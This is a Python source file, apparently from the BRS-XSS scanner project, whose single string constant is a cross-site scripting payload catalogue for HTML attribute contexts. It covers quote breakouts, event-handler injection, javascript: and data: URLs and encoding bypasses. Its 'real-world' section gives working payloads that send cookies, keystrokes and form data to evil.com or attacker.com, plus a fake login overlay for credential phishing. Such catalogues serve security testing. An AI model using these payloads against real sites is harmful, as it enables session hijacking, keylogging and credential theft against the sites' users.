#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

HTML Attribute Context - Attack Vectors
"""

ATTACK_VECTOR = """
BREAKING OUT OF QUOTED ATTRIBUTES:

1. DOUBLE QUOTES:
   Input in: <input value="USER_INPUT">
   
   Basic breakout:
   " onload=alert(1) x="
   Result: <input value="" onload=alert(1) x="">
   
   Autofocus technique:
   " onfocus=alert(1) autofocus x="
   Result: <input value="" onfocus=alert(1) autofocus x="">
   
   Multiple events:
   " onmouseover=alert(1) onfocus=alert(1) autofocus x="

2. SINGLE QUOTES:
   Input in: <input value='USER_INPUT'>
   
   Basic breakout:
   ' onload=alert(1) x='
   Result: <input value='' onload=alert(1) x=''>
   
   With encoding:
   &#39; onload=alert(1) x=&#39;

3. UNQUOTED ATTRIBUTES (Most Dangerous):
   Input in: <input value=USER_INPUT>
   
   Direct injection (no quote needed):
   x onload=alert(1)
   Result: <input value=x onload=alert(1)>
   
   Alternative events:
   x onfocus=alert(1) autofocus
   x onmouseover=alert(1)
   x onclick=alert(1)

4. CLOSING TAG:
   Input in: <div title="USER_INPUT">
   
   Close tag and inject new content:
   "><script>alert(1)</script><div x="
   Result: <div title=""><script>alert(1)</script><div x="">

EVENT HANDLER INJECTION TECHNIQUES:

5. AUTOFOCUS EVENTS (No user interaction):
   " onfocus=alert(1) autofocus "
   " onfocus=alert(document.domain) autofocus "
   ' onfocus=alert`1` autofocus '

6. ACCESSKEY (Social engineering):
   " accesskey=x onclick=alert(1) "
   (User presses Alt+X or Alt+Shift+X)
   
   " accesskey=a onclick=alert(1) title="Press Alt+A to continue" "

7. MODERN EVENT HANDLERS:
   
   Pointer events:
   " onpointerrawupdate=alert(1) "
   " onpointerover=alert(1) "
   " onpointerenter=alert(1) "
   
   Auxiliary click:
   " onauxclick=alert(1) "
   (Triggered by middle mouse button)
   
   Toggle:
   " ontoggle=alert(1) "
   (For <details> elements)
   
   Animation events:
   " onanimationstart=alert(1) style=animation-name:x "
   " onanimationend=alert(1) style=animation:x+1s "
   
   Transition events:
   " ontransitionend=alert(1) style=transition:all+1s "

8. SVG/XML EVENT HANDLERS:
   " onbegin=alert(1) " (SVG animations)
   " onend=alert(1) " (SVG animations)
   " onrepeat=alert(1) " (SVG animations)

9. MUTATION EVENTS (Deprecated but still work):
   " onDOMActivate=alert(1) "
   " onDOMFocusIn=alert(1) "
   " onDOMSubtreeModified=alert(1) "

10. FORM-RELATED EVENTS:
    " oninput=alert(1) "
    " onchange=alert(1) "
    " oninvalid=alert(1) "
    " onsubmit=alert(1) "
    " onreset=alert(1) "

URL ATTRIBUTE EXPLOITATION:

11. HREF ATTRIBUTE:
    <a href="USER_INPUT">Click</a>
    
    JavaScript protocol:
    javascript:alert(1)
    javascript:eval(atob('YWxlcnQoMSk='))
    javascript:fetch('//evil.com?c='+document.cookie)
    
    Data URLs:
    data:text/html,<script>alert(1)</script>
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
    
    With encoding bypasses:
    jav&#x09;ascript:alert(1)
    jav&#x0A;ascript:alert(1)
    &#106;avascript:alert(1)

12. SRC ATTRIBUTE:
    <img src="USER_INPUT">
    <script src="USER_INPUT">
    <iframe src="USER_INPUT">
    
    JavaScript protocol:
    javascript:alert(1)
    
    Data URLs:
    data:text/html,<script>alert(1)</script>
    
    External malicious script:
    //evil.com/xss.js
    https://evil.com/xss.js

13. FORMACTION ATTRIBUTE (HTML5):
    <button formaction="USER_INPUT">
    <input type="submit" formaction="USER_INPUT">
    
    Hijack form submission:
    javascript:alert(1)
    //evil.com/steal

14. ACTION ATTRIBUTE:
    <form action="USER_INPUT">
    
    Redirect form data:
    javascript:alert(1)
    //evil.com/phish

BYPASSES AND TECHNIQUES:

15. HTML5 DATA ATTRIBUTES:
    If JavaScript processes data-* attributes:
    <div data-config="USER_INPUT">
    
    Payload:
    {"exec":"alert(1)"}
    </div><script>alert(1)</script><div x="

16. ARIA ATTRIBUTES:
    " aria-label="x" onfocus="alert(1)" autofocus x="
    " aria-describedby="x" onmouseover="alert(1)" x="

17. STYLE ATTRIBUTE:
    <div style="USER_INPUT">
    
    Expression (IE):
    expression(alert(1))
    
    Background with JavaScript (legacy):
    background:url(javascript:alert(1))
    
    Import:
    @import'javascript:alert(1)';
    
    Breaking out:
    " onload=alert(1) x="

18. CLASS ATTRIBUTE EXPLOITATION:
    If CSS has dangerous selectors:
    <div class="USER_INPUT">
    
    Payload:
    " onload=alert(1) x="
    
    Or exploit CSS injection if class affects styles

19. TITLE ATTRIBUTE:
    <div title="USER_INPUT">
    
    Break out:
    " onmouseover=alert(1) x="
    " onclick=alert(1) x="

20. CONTENTEDITABLE WITH EVENTS:
    " contenteditable onfocus=alert(1) autofocus x="

ENCODING BYPASSES:

21. HTML ENTITY ENCODING:
    &#34; = "
    &#39; = '
    &#x22; = "
    &#x27; = '
    
    Payload:
    &#34; onfocus=alert(1) autofocus x=&#34;

22. URL ENCODING:
    %22 = "
    %27 = '
    %3C = <
    %3E = >
    
    In href:
    javascript:alert%281%29

23. UNICODE ESCAPES:
    \\u0022 = "
    \\u0027 = '
    
    In JavaScript contexts:
    " onclick="alert(\\u0031)" "

24. NULL BYTES:
    "%00 onfocus=alert(1) autofocus x=
    Some parsers stop at null byte

25. NEWLINES AND TABS:
    "\\n onfocus=alert(1) autofocus x="
    "\\t onfocus=alert(1) autofocus x="

REAL-WORLD ATTACK SCENARIOS:

STORED XSS VIA PROFILE:
User enters in "Website" field:
" onfocus=alert(document.cookie) autofocus x="

Rendered as:
<input type="url" value="" onfocus=alert(document.cookie) autofocus x="">

SESSION HIJACKING:
" onfocus="fetch('//attacker.com?c='+btoa(document.cookie))" autofocus x="

KEYLOGGER:
" onfocus="document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)}" autofocus x="

FORM HIJACKING:
<button formaction="USER_INPUT">Update Profile</button>

Payload:
javascript:fetch('//evil.com/steal',{method:'POST',body:new FormData(this.form)})

CREDENTIAL THEFT:
<a href="USER_INPUT">Reset Password</a>

Payload:
javascript:document.body.innerHTML='<form action=//evil.com/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'

CLICKJACKING:
" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer" onclick="fetch('//evil.com/click')" x="

CONTEXT-SPECIFIC ATTACKS:

SVG href:
<svg><use href="USER_INPUT">

Payload:
data:image/svg+xml,<svg id=x onload=alert(1)>

Meta refresh:
<meta http-equiv="refresh" content="0; url=USER_INPUT">

Payload:
javascript:alert(1)

Link prefetch:
<link rel="prefetch" href="USER_INPUT">

Payload:
//evil.com/track
"""

